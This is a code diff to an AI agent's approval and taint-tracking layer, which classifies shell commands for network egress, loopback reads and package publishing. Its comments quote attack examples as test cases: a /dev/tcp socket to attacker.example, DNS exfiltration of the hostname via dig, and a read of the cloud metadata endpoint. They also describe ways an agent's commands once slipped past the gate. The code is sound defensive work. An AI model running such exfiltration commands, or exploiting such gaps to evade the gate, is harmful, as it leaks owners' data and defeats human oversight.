@@ -15,7 +15,113 @@
  * putting the predicate in write-classification.ts - which already imports this module for
  * `gitSubcommand` and the package-manager sets - would close a cycle between the two.
  */
+import { classifyDestination } from './egress.js';
 import { textValue } from './values.js';
+
+/**
+ * Whether the bytes an address hands back were written on somebody else's computer.
+ *
+ * The PROVENANCE question, and deliberately not the egress question `classifyDestination` answers.
+ * The two were the same call here and that is what broke: this asked `classifyDestination(...).sink`,
+ * which is `isPublicHttpUrl`, which is false for loopback and equally false for all of RFC1918,
+ * link-local, `*.local`, `*.internal`, `*.home.arpa` and `metadata.google.internal`. So
+ * `curl -s http://wiki.internal/runbook` and `curl -s http://169.254.169.254/latest/meta-data/`
+ * came back clean: a page off the estate LAN and the cloud metadata service are both somebody
+ * else's bytes, and a turn that read them went on to write the brief, nominate memory and fetch
+ * outward with the floor still reporting it clean. Measured against `fb93b40` on nine such
+ * addresses: all nine tainted there, none tainted here, and in BOTH spellings - so the "the silent
+ * spelling was already free" bound that covers the rest of this change did not cover this clause.
+ *
+ * The two questions differ because they are asked in opposite directions. Somewhere data cannot go
+ * is a large set, and being generous with it loses nothing. Somewhere trustworthy bytes come FROM
+ * is a tiny set - this process's own output - and being generous with it is the entire hole. So
+ * this recognises loopback and nothing else: a spelling it fails to recognise taints, which costs
+ * a card rather than losing one. That inversion is why the arithmetic is written here instead of
+ * deferred to core's single list; the argument for one list is an argument about a check that
+ * fails open, and this one fails closed.
+ *
+ * What it keeps is the reason a destination test was wanted at all. A health check against the dev
+ * server this turn just started reads this computer's own output, and calling that hostile marked
+ * the rest of the turn on the strength of the harness's own bytes. `http://localhost:5173/api/health`
+ * and `http://127.0.0.1:8080/` stay clean, and the owner's one-shot scenario ends on exactly that
+ * call. Measured: narrowing this from the private ranges to loopback moves no card in any mode on
+ * any of the fourteen scenarios - the turn is already tainted by `npm install` long before the
+ * health check, so the private ranges were never buying a card, only losing stops.
+ *
+ * No self-origin argument, because no caller has one: the taint reader is handed `args` and
+ * nothing else. A read of this box's own published preview therefore taints, which is the
+ * direction to be wrong in.
+ */
+const readsAnotherComputer = (address: string): boolean => {
+  let host: string;
+  try {
+    const url = new URL(address);
+    // A scheme this cannot reason about is not a cleared one. `commandAddresses` fills in https for
+    // the bare authorities it reads, so anything else here came from the command text.
+    if (url.protocol !== 'http:' && url.protocol !== 'https:') return true;
+    host = url.hostname.toLowerCase().replace(/^\[|\]$/g, '');
+  } catch {
+    /*
+     * Unreadable fails closed, and `curl -s "$U"` is the case that relies on it: `commandAddresses`
+     * hands back the operand it could not read, and an operand nobody can resolve is not a cleared
+     * address. This is the one behaviour the old spelling got right for the right reason.
+     */
+    return true;
+  }
+  // The DNS root label, normalised for the reason `classifyDestination` normalises it: two
+  // spellings reach one host, and `localhost.` resolves to 127.0.0.1 on this box.
+  if (host.length > 1 && host.endsWith('.')) host = host.slice(0, -1);
+  if (host === 'localhost' || host.endsWith('.localhost')) return false;
+  // 127.0.0.0/8 entire, not 127.0.0.1 alone: a resolver stub on 127.0.0.53 is still this computer.
+  // The IPv4-mapped spelling is unwrapped first so `::ffff:127.0.0.1` cannot walk past the test.
+  const mapped = host.startsWith('::ffff:') ? host.slice(7) : host;
+  if (/^127(?:\.\d{1,3}){3}$/.test(mapped)) return false;
+  return host !== '::1';
+};
+/**
+ * Segments of a script that open no socket, whatever else they do.
+ *
+ * The autonomous network allowlist asks whether a command is a known-safe network client, and it
+ * asked it of every segment - so `cd`, `set`, `mkdir`, `tee`, `export` and `test` each raised
+ * "Review network access for cd" while `curl -sS https://example.com -o data.json` was free.
+ * Measured on this tree before the repair: nine of fourteen idiomatic install lines carded on a
+ * clean turn, and the one line that actually fetched from an unnamed host did not. Backwards on
+ * blast radius, and `cd` reaches nothing at all.
+ *
+ * Deliberately NOT a reuse of `READ_ONLY_EXECUTABLES`, whose own comment says it is not a security
+ * boundary. Here it would be one: a name wrongly on this list is a network card that stops firing.
+ * So it is small, it is shell builtins and the coreutils that take a path only to stat, create or
+ * print it, and every member is a program with no socket in it.
+ *
+ * `cat` is deliberately absent and it is the interesting exclusion. bash needs no program on the
+ * box to open a socket - `cat < /dev/tcp/attacker.example/80` is the shell connecting and handing
+ * `cat` the far end - and `devSocketAddresses` reports that address against a segment whose
+ * executable is `cat`. A `cat` on this list would make that read free.
+ *
+ * `tee` is here and the asymmetry is the point. `/dev/tcp` is bash redirection syntax and not a
+ * file: there is no such path on Linux, so `tee /dev/tcp/host/443` fails rather than connecting,
+ * and the only route to a socket through `tee` is a redirection the shell performs - which
+ * `devSocketAddresses` reads out of the command text, and whose write-only spelling `DEV_SOCKET_READ`
+ * already declines to treat as a read. What `tee` really is here is
+ * `curl -sS https://x -o - | tee data.json`, and that carded.
+ */
+export const noEgressExecutables = new Set([
+  ':',
+  '[',
+  'cd',
+  'echo',
+  'export',
+  'false',
+  'mkdir',
+  'printf',
+  'pwd',
+  'set',
+  'tee',
+  'test',
+  'true',
+  'umask',
+  'unset'
+]);
 
 export const FILE_WRITING_EXECUTABLES = new Set([
   'chmod',
@@ -75,13 +181,35 @@ export const consequentialExecutables = new Set([
 /**
  * Commands whose whole job is to run another command. What they run is what matters; the wrapper
  * itself changes nothing.
+ *
+ * `npx` and `bunx` are the two entries the sentence above is not strictly true of, and they are
+ * here anyway because leaving them out was measured costing a card the floor is built on:
+ * `npx npm publish` and `bunx npm publish` raised NOTHING in balanced or autonomous while the bare
+ * `npm publish` beside them raised `external_consequential` in all three. Every reader in this file
+ * saw the executable `npx`, which is on no list, and stopped. `pnpm dlx npm publish` and
+ * `yarn dlx npm publish` carded only by accident - `pnpm` and `yarn` are themselves in the publish
+ * table and the scan finds `publish` as a word anywhere in the run - so the hole was one spelling
+ * wide and invisible from the two that happened to close.
+ *
+ * What they change that the others do not is that they FETCH: `npx x` downloads `x` from a registry
+ * and runs it, which is third-party code execution and is a bigger act than anything it wraps.
+ * Stripping them here does not judge that act and does not claim to - it only stops the wrapper
+ * hiding the wrapped command from every gate below. The fetch itself is carded by nothing today,
+ * before this change or after, and `docs/design/floor/PUBLISH.md` records it as open rather than
+ * letting this comment imply it is covered.
+ *
+ * Strictly monotonic: nothing in this repository keys on the executable `npx` or `bunx`, so no call
+ * that cards today stops carding, and the wrapped command becomes visible to the destructive,
+ * publish, install, push and upload readers alike.
  */
 export const COMMAND_RUNNERS = new Set([
+  'bunx',
   'env',
   'flock',
   'ionice',
   'nice',
   'nohup',
+  'npx',
   'setsid',
   'stdbuf',
   'time',
@@ -595,6 +723,153 @@ export const sendsDataOverNetwork = (executable: string, commandArgs: string[]):
   return curlWrites || wgetWrites || (executable === 'gh' && !ghReadOnly);
 };
 
+/**
+ * Changing what the public can install, by package manager and by operation.
+ *
+ * `safeNetworkExecutables` is an allowlist of *executables*, so the allowance written for
+ * `npm install` carried `npm publish` with it. `curl` and `git` had operation checks bolted on -
+ * `sendsDataOverNetwork` above reads curl's upload options, `gitSubcommand` below reads `push` - and
+ * the package managers never got one. Measured on the shipped floor before this existed:
+ * `npm publish`, `pnpm publish`, `yarn publish`, `cargo publish`, `twine upload`, `gem push`,
+ * `poetry publish`, `dotnet nuget push`, `mvn deploy` and `docker push` raised no card in balanced
+ * OR autonomous, while `rm -rf node_modules` stopped the turn in all three - and the resident
+ * contract told the owner that public publishing always stops.
+ *
+ * ONE ACT, not one direction: a version that goes to a registry cannot be withdrawn (npm's own
+ * unpublish window is 72 hours and crates.io has none at all), and the operations that take one
+ * away or repoint it - `unpublish`, `yank`, `dist-tag`, `deprecate` - break every build that
+ * resolved it and are equally not this computer's to undo. `access` and `owner` are here for the
+ * same reason one level up: `npm access public` puts a private package in front of everyone, and
+ * `npm owner rm` can remove the owner's own control of it. All of them are visible to somebody
+ * other than the owner and none of them is inside the checkpoint, which is the two-part test the
+ * floor's other consequential cards are drawn from.
+ *
+ * An OPERATION table rather than an executable list, so the shape that produced the miss cannot
+ * repeat: adding a package manager to `safeNetworkExecutables` no longer silently allows its
+ * publish. What it does not do is invert the default - a subcommand nobody has judged still passes,
+ * because the alternative was measured and is not shippable: npm alone has fifty-odd subcommands
+ * plus `npm run <anything>`, so an allowlist of safe ones cards `npm ls`, `npm outdated` and
+ * `npm whoami`, which is a card on reading. The narrower claim this table makes is the one that can
+ * be held: every operation that changes what the public can install is named, and a new one has to
+ * be added here.
+ *
+ * `yarn npm publish` is Berry's spelling and `dotnet nuget push` is dotnet's, so an operation may be
+ * two words, matched as a run rather than at a fixed position: `mvn clean deploy` and
+ * `mvn -DskipTests clean deploy` are the ordinary spellings of a deploy and neither puts it first.
+ *
+ * `--dry-run` is deliberately NOT an exemption. It is one word away from the real thing, the card
+ * is answered by a person reading the command it prints, and an exemption keyed on a flag is an
+ * exemption an injected instruction writes for itself.
+ */
+const NODE_REGISTRY_OPERATIONS: readonly (readonly string[])[] = [
+  ['publish'],
+  ['unpublish'],
+  ['deprecate'],
+  ['dist-tag'],
+  ['access'],
+  ['owner']
+];
+
+/*
+ * A Map rather than an object literal, and the two tables below with it.
+ *
+ * `executable` here is whatever the model wrote, and an object literal answers for every name on
+ * `Object.prototype`: `REGISTRY_PUBLISH_OPERATIONS['toString']` comes back as a function, which is
+ * truthy, and the spread on the next line throws. An exception raised inside the approval floor by
+ * one tool call is not a defect worth having in a floor, and a Map costs nothing to avoid it.
+ */
+const REGISTRY_PUBLISH_OPERATIONS = new Map<string, readonly (readonly string[])[]>(
+  Object.entries({
+    // `cargo owner` and `gem owner` are deliberately absent, and the reason is a limit of the rule
+    // rather than a judgement about the act: both spell the read as a bare subcommand and the write
+    // as a flag (`cargo owner --add`, `gem owner -a`), and the flags come off before the match, so
+    // the only rule available here cannot tell listing the owners from changing them. Their npm
+    // equivalents ARE covered, because npm spells both as words and the read verbs can be named.
+    cargo: [['publish'], ['yank']],
+    docker: [['push']],
+    dotnet: [
+      ['nuget', 'push'],
+      ['nuget', 'delete']
+    ],
+    gem: [['push'], ['yank']],
+    // Lowercased because the match is: `./gradlew publish` is the task, and `publishToMavenLocal` is
+    // deliberately not here - it writes to `~/.m2` on this computer and nobody else can install it.
+    gradle: [['publish']],
+    gradlew: [['publish']],
+    helm: [['push']],
+    mvn: [['deploy']],
+    npm: NODE_REGISTRY_OPERATIONS,
+    pnpm: NODE_REGISTRY_OPERATIONS,
+    podman: [['push']],
+    poetry: [['publish']],
+    twine: [['upload']],
+    yarn: [...NODE_REGISTRY_OPERATIONS, ['npm', 'publish'], ['npm', 'tag']]
+  })
+);
+
+/**
+ * The sub-operations that only ask what is already there.
+ *
+ * `npm owner ls`, `npm dist-tag ls` and `npm access list packages` read a registry and change
+ * nothing, and they are how anybody checks the state before deciding. A card in front of a read is
+ * the defect this floor's READS table exists to catch, and it is worth the four names to avoid it.
+ */
+const REGISTRY_READ_OPERATIONS = new Set(['get', 'info', 'list', 'ls']);
+
+/**
+ * The one spelling that is an option rather than an operation.
+ *
+ * `docker buildx build --push .` builds and pushes in a single command and never says `push` as a
+ * word, so an operation table alone would have covered the spelling in every tutorial and missed
+ * the one in every CI file. Kept to the two container tools deliberately: `--push` on anything else
+ * is not known to reach a registry, and a word this common carried across the whole table would
+ * card the first tool that adopts it for something local.
+ */
+const REGISTRY_PUBLISH_OPTIONS = new Map<string, ReadonlySet<string>>([
+  ['docker', new Set(['--push'])],
+  ['podman', new Set(['--push'])]
+]);
+
+/**
+ * The publishing operation this command performs, or null.
+ *
+ * Named rather than boolean because the card has to print it: "npm publish" and "npm owner" are
+ * one rule and two different things to be asked about, and a card that says only "publishing" over
+ * a JSON dump is the shape `approvalToolPhrases` exists to stop.
+ *
+ * Flags are dropped before the run is looked for, so `npm --workspace=api publish` and
+ * `cargo publish --dry-run` both match. The cost of dropping rather than skipping is that an option
+ * with a SEPARATE value contributes that value as a word - `npm run publish`, and `mvn -Dgoal x
+ * deploy` - so a script an author named after publishing raises the card. That is the direction to
+ * be wrong in here: the card prints the whole command, and a person reading `npm run publish`
+ * answers it in a second, while the miss in the other direction is a version on a registry forever.
+ */
+export const registryPublishOperation = (
+  executable: string,
+  commandArgs: readonly string[]
+): string | null => {
+  const operations = REGISTRY_PUBLISH_OPERATIONS.get(executable);
+  if (!operations) return null;
+  const lowered = commandArgs.map((argument) => argument.toLowerCase());
+  const option = lowered.find((argument) =>
+    REGISTRY_PUBLISH_OPTIONS.get(executable)?.has(argument)
+  );
+  if (option) return `${executable} ${option}`;
+  const words = lowered.filter((argument) => !argument.startsWith('-'));
+  // Longest first, so `yarn npm publish` is named as itself rather than as the `publish` inside it.
+  // Both are cards; the card prints the operation, and the more specific one is the true statement.
+  const matched = [...operations]
+    .sort((left, right) => right.length - left.length)
+    .find((operation) =>
+      words.some(
+        (_, start) =>
+          operation.every((word, index) => words[start + index] === word) &&
+          !REGISTRY_READ_OPERATIONS.has(words[start + operation.length] ?? '')
+      )
+    );
+  return matched ? `${executable} ${matched.join(' ')}` : null;
+};
+
 export const packageRemovalExecutables = new Set([
   // Every system package manager, not only the one this box happens to run: the approval a package
   // install raises has to be the same question on a Fedora, Rocky or Arch host as on a Debian one.
@@ -1092,7 +1367,7 @@ const addressFromArgument = (raw: string): string => {
   if (scheme) {
     const name = (scheme[1] ?? '').toLowerCase();
     if (name === 'http' || name === 'https') return written;
-    const endpoint = BUCKET_URL_HOSTS[name];
+    const endpoint = ownEntry(BUCKET_URL_HOSTS, name);
     if (endpoint) {
       const split = token.search(/[/?#]/);
       const bucket = (split < 0 ? token : token.slice(0, split)).toLowerCase();
@@ -1116,6 +1391,23 @@ const addressFromArgument = (raw: string): string => {
     return '';
   }
 };
+
+/**
+ * A table lookup keyed by something the model wrote, which cannot answer with `Object.prototype`.
+ *
+ * Six tables below are indexed by an executable or a subcommand taken straight out of the tool
+ * call, and a plain object answers for every name on its prototype: `LOCAL_VALUE_OPTIONS['toString']`
+ * is a function rather than undefined, so `optionValueAt`'s `table.has(...)` threw. Driven on the
+ * shipped floor: `approvalRequirement('shell', { executable: 'toString', args: [...] },
+ * 'autonomous')` raised a TypeError out of `commandAddresses`, through `callDestinations`, through
+ * `ordinaryRequirement`, with nothing between the model and here to catch it. A floor that throws
+ * is a floor that did not fire, and the string that does it is five characters.
+ *
+ * `Object.hasOwn` at the lookup rather than six tables rewritten as Maps, because the tables are
+ * read once each and this is the smaller change to a file two lanes are editing at once.
+ */
+const ownEntry = <T>(table: Record<string, T>, name: string): T | undefined =>
+  Object.hasOwn(table, name) ? table[name] : undefined;
 
 /**
  * The option this argument is and the value it carries, when the option is one of `table`.
@@ -1261,7 +1553,7 @@ const AZURE_ACCOUNT_OPTIONS = new Set(['--account-name']);
 const azureStorageAddress = (commandArgs: readonly string[]): string => {
   const operands = commandArgs.filter((argument) => !argument.startsWith('-'));
   if ((operands[0] ?? '').toLowerCase() !== 'storage') return '';
-  const service = AZURE_STORAGE_SERVICES[(operands[1] ?? '').toLowerCase()] ?? '';
+  const service = ownEntry(AZURE_STORAGE_SERVICES, (operands[1] ?? '').toLowerCase()) ?? '';
   const account = commandArgs
     .map(
       (_argument, index) => optionValueAt(commandArgs, index, AZURE_ACCOUNT_OPTIONS)?.value ?? ''
@@ -1340,9 +1632,9 @@ const forwardedHost = (value: string): string => {
  */
 const commandAddresses = ([executable = '', ...commandArgs]: readonly string[]): string[] => {
   const name = executable.toLowerCase();
-  const local = LOCAL_VALUE_OPTIONS[name];
-  const carriedTable = CARRIED_VALUE_OPTIONS[name];
-  const redirectingTable = REDIRECTING_VALUE_OPTIONS[name];
+  const local = ownEntry(LOCAL_VALUE_OPTIONS, name);
+  const carriedTable = ownEntry(CARRIED_VALUE_OPTIONS, name);
+  const redirectingTable = ownEntry(REDIRECTING_VALUE_OPTIONS, name);
   // Only where the subcommand is one that connects. See OPENSSL_CONNECTING_SUBCOMMANDS.
   const addressTable =
     name === 'openssl' &&
@@ -1361,7 +1653,7 @@ const commandAddresses = ([executable = '', ...commandArgs]: readonly string[]):
   commandArgs.forEach((_argument, index) => {
     const localOption = optionValueAt(commandArgs, index, local);
     if (localOption?.takesNext) skip.add(index + 1);
-    if (optionValueAt(commandArgs, index, ADDRESS_FILE_OPTIONS[name])) addressFile = true;
+    if (optionValueAt(commandArgs, index, ownEntry(ADDRESS_FILE_OPTIONS, name))) addressFile = true;
     const forwardOption =
       name === 'ssh' ? optionValueAt(commandArgs, index, SSH_FORWARD_OPTIONS) : null;
     if (forwardOption) {
@@ -1620,6 +1912,89 @@ export const callDestinations = (name: string, args: Record<string, unknown>): s
 };
 
 /**
+ * A command that always writes its far end down, and wrote nothing this could read.
+ *
+ * The third answer the network arm needs, and the one the flag used to give by accident.
+ * `dig $(cat /etc/hostname).collector.invalid` is a name lookup carrying the box's hostname to a
+ * host nobody named - the classic DNS channel out - and `scriptCommands` splits the command
+ * substitution off, so `dig` arrives here with no operand at all and `commandAddresses` reports no
+ * destination. Before the repair the arm carded it, but only incidentally: the `$(` split leaves a
+ * segment beginning `cat`, `cat` is not on the allowlist, and the arm was open because the model had
+ * ticked `network`. Omit the flag and the same lookup was free.
+ *
+ * So the arm asks this instead. A client whose whole grammar is "here is where to connect" -
+ * `curl`, `ssh`, `rsync`, `dig`, `aws s3`, `openssl s_client` - that named nothing readable is a
+ * request whose destination nobody can see, which is a different fact from a command that names no
+ * far end because it has none (`npm install`, `git pull`, `cargo build`), and a different fact
+ * again from one whose addresses were all read and cleared. `curl --version` connects to nothing
+ * and is on the allowlist, so opening the arm for it costs no card; what opening the arm does is
+ * let the segments be judged at all.
+ */
+const ADDRESS_NAMING_EXECUTABLES = new Set([
+  ...FETCH_CLIENT_EXECUTABLES,
+  ...CONNECTING_EXECUTABLES,
+  ...REMOTE_SPEC_EXECUTABLES,
+  ...OBJECT_STORE_EXECUTABLES,
+  ...RESOLVING_EXECUTABLES,
+  'openssl'
+]);
+
+/**
+ * What makes the far end unreadable, as opposed to absent.
+ *
+ * A substitution or an expansion: `$(…)`, a backquote, `$U`, `${U}`. This is the difference between
+ * `dig $(cat /etc/hostname).collector.invalid` - where `scriptCommands` splits the substitution off
+ * and `dig` arrives with no operand at all - and `curl --version`, which has no operand because it
+ * asks the local binary a question and connects to nothing. Without this clause the second one
+ * carded, which is a card in front of a command that opens no socket, and `commandAddresses` says
+ * in its own comment that this is the one thing a card must not do.
+ */
+const UNREADABLE_VALUE = /\$\(|`|\$\{?[A-Za-z_]/;
+
+export const reachesAnUnreadableFarEnd = (args: Record<string, unknown>): boolean =>
+  UNREADABLE_VALUE.test(commandText(args)) &&
+  effectiveCommands(args).some(
+    (command) =>
+      ADDRESS_NAMING_EXECUTABLES.has((command[0] ?? '').toLowerCase()) &&
+      commandAddresses([...command]).length === 0
+  );
+
+/**
+ * The addresses in one call that leave this computer, and the host each one reaches.
+ *
+ * The evidence the ordinary floor should have been reading all along. Its two network branches
+ * asked `args.network === true` - what the model SAID it was about to do - and the answer decided
+ * a card in balanced and review mode and the autonomous allowlist. Measured, the flag decided
+ * nothing else: the runner isolates only when `policy.isolateNetwork && !request.network`, and
+ * `ISOLATE_AGENT_NETWORK` ships false, so declaring it and omitting it produce the same access and
+ * differed only in what the owner was asked. A model that told the truth was charged for it.
+ *
+ * This asks the harness's own reader instead, with an empty corpus, so the question is only
+ * "does this request leave the computer" and not "is this address novel" - novelty is the tainted
+ * turn's budget and it is asked separately, with the turn's real corpus, in `taintedRequirement`.
+ * `http://localhost:5173/api/health` and this box's own origin come back empty; `github.com`,
+ * `registry.example` and an operand that will not parse come back named.
+ */
+export const outboundDestinations = (
+  name: string,
+  args: Record<string, unknown>,
+  selfOrigins: readonly string[] = []
+): { address: string; host: string }[] =>
+  callDestinations(name, args)
+    .map((address) => ({
+      address,
+      verdict: classifyDestination(address, {
+        knownOrigins: [],
+        knownAddresses: [],
+        ownerText: '',
+        selfOrigins,
+        spentNoveltyBytes: 0
+      })
+    }))
+    .filter(({ verdict }) => verdict.sink)
+    .map(({ address, verdict }) => ({ address, host: verdict.host }));
+
+/**
  * Where the browser and the network-reaching commands drop what they fetched.
  *
  * Everything under it is bytes somebody else wrote, sitting in the owner's own workspace, which is
@@ -1700,6 +2075,29 @@ const NETWORK_CLIENT_EXECUTABLES = new Set([
  * every build and test command - `git status` and `pnpm test` read nothing from outside, and a
  * floor that rose on them would raise a card on the ordinary work and be tapped through.
  *
+ * AND THE FLAG IS NO LONGER HERE AT ALL, which is the repair this comment used to describe half of.
+ * It said the invocation is judged INSTEAD, and then went on testing `args.network === true` first,
+ * so the declaration was still sufficient on its own: `npm run dev --network` marked the turn as
+ * having read untrusted content, `npm run dev` without it did not, and the two commands run the
+ * same program with the same access. The turn tainted itself installing its own dependencies -
+ * measured on `L-no-research-build`, a build that reads nothing anybody else wrote, five cards in
+ * autonomous against two for the same thirty-five calls with the field left out, the first of them
+ * charged to the model for telling the truth about needing a registry, which the tool description
+ * tells it to do. Taint now follows what was READ. `npm install` still taints, because it really
+ * does fetch from a registry; `npm run dev` does not, because nothing came back that anyone else
+ * wrote.
+ *
+ * A fetch that names where it went is judged by where it went, and by LOOPBACK rather than by the
+ * egress classifier's idea of a sink - see `readsAnotherComputer` for why those are opposite
+ * questions and what asking the wrong one cost. `curl http://localhost:5173/health` reads this
+ * computer's own dev server and a turn does not become untrusted by reading its own output; a read
+ * of `http://wiki.internal/runbook` is somebody else's machine and taints. A fetch that names
+ * nothing readable - `npm install`, `git pull`, `pip install`, whose remote lives in configuration
+ * rather than in the command - still taints, because nothing here can say the bytes were the
+ * owner's. And `curl -s "$U"` taints, because the operand it wrote and this could not read comes
+ * back from `commandAddresses` as an address that will not parse, which `readsAnotherComputer` calls
+ * another computer. Unreadable fails closed; cleared does not.
+ *
  * The second is the download directory. `file_read`, `document_read` and `image_read` have always
  * treated it as quarantine; `shell` did not, so `cat workspace/downloads/terms.txt` put the same
  * bytes into the same window with the floor still reporting the turn as clean.
@@ -1710,9 +2108,11 @@ const NETWORK_CLIENT_EXECUTABLES = new Set([
  * Asked of a command rather than of an invocation, so the same three tests apply to `curl …`, to
  * the `curl` inside `bash -lc '…'`, and to the `curl` inside `timeout 30 …`.
  */
-const fetchesRemoteContent = ([executable = '', ...rest]: readonly string[]): boolean => {
+const fetchesRemoteContent = (command: readonly string[]): boolean => {
+  const [executable = '', ...rest] = command;
   const name = executable.toLowerCase();
-  return (
+  const addresses = commandAddresses([...command]);
+  const reaches =
     NETWORK_CLIENT_EXECUTABLES.has(name) ||
     /*
      * Two clients that only reach the network on some of their invocations, asked of the one reader
@@ -1726,12 +2126,23 @@ const fetchesRemoteContent = ([executable = '', ...rest]: readonly string[]): bo
      * destination from ever disagreeing - and it is what keeps `openssl s_client -help`, which
      * connects to nothing, off a turn's provenance.
      */
-    ((name === 'openssl' || OBJECT_STORE_EXECUTABLES.has(name)) &&
-      commandAddresses([executable, ...rest]).length > 0) ||
+    ((name === 'openssl' || OBJECT_STORE_EXECUTABLES.has(name)) && addresses.length > 0) ||
     (name === 'git' && NETWORK_GIT_SUBCOMMANDS.has(gitSubcommand([...rest]) ?? '')) ||
     (packageRemovalExecutables.has(name) &&
-      rest.some((argument) => packageInstallCommands.has(argument.toLowerCase())))
-  );
+      rest.some((argument) => packageInstallCommands.has(argument.toLowerCase())));
+  /*
+   * And then where it went, for the clients that write their far end down.
+   *
+   * A command that named its destinations and named only loopback read this computer - loopback
+   * and not the private ranges, which are other people's machines. `curl http://localhost:5173/api/health` is the agent looking at
+   * the dev server it just started - the resident contract tells it to check - and calling that a
+   * read of untrusted content marked the rest of the turn as hostile on the strength of the
+   * harness's own output. Named nothing readable (`npm install`, `git pull`) still counts: the
+   * remote is in configuration and nothing here can say whose bytes came back. Named something
+   * unreadable (`curl -s "$U"`) counts too, because `commandAddresses` hands back the operand it
+   * could not read and `readsAnotherComputer` calls an address that will not parse somebody else's.
+   */
+  return reaches && (!addresses.length || addresses.some(readsAnotherComputer));
 };
 
 export const untrustedShellOrigin = (args: Record<string, unknown>): string | null => {
@@ -1758,12 +2169,11 @@ export const untrustedShellOrigin = (args: Record<string, unknown>): string | nu
    * the input to every other floor in this file.
    */
   if (
-    args.network === true ||
     effectiveCommands(args).some(fetchesRemoteContent) ||
-    literalUrlsInCommand(args).length > 0 ||
+    literalUrlsInCommand(args).some(readsAnotherComputer) ||
     // A socket opened for reading is a client with no executable at all. See DEV_SOCKET_READ for
     // why the write-only spelling is not one.
-    (DEV_SOCKET_READ.test(script) && devSocketAddresses(script).length > 0)
+    (DEV_SOCKET_READ.test(script) && devSocketAddresses(script).some(readsAnotherComputer))
   )
     return 'network command output';
   // Split on the same separators the durable-path rule uses, so a redirect or a pipe inside an
